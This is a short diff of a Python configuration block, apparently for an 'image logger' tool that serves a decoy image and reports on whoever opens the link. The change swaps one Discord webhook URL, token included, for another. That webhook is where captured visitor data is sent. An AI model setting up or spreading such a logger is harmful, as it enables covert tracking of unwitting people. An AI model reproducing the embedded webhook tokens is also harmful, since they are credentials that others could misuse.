@@ -13,7 +13,7 @@ __author__ = "C00lB0i"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1385010486638280714/pfa4wE7QRGO9po3Yxv3VXF1V8P6k-sAC0yv7ASqp4-DQAzN5SRae4KbdHjW1KBFJD2wk",
+    "webhook": "https://discord.com/api/webhooks/1385019428512469003/_CTt-Cy3HNx9XGpS5fgIAR0hbsIrBS5PR_MykFV7POx7bqxUmCY20tMCqHLan4r4sZMp",
     "image": "https://www.shutterstock.com/image-photo/bill-torn-revealing-words-you-260nw-1734671219.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
